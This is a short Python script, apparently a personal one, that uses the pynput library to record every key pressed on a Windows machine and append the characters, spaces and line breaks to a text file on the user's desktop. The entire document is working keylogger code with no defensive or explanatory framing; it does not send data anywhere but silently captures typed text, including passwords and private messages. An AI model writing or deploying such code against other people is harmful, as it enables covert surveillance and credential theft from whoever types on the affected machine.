from pynput.keyboard import Listener


def key_press(key):
    with open(r"C:\Users\leonw\Desktop\wsad.txt" ,"a")as f:
        try:
            f.write("{0}".format(key.char))
        except AttributeError:
            if"space" in str(key):
                f.write(" ")
            elif"enter" in str(key):
                f.write("\n")


with Listener(on_press=key_press)as l:
    l.join()
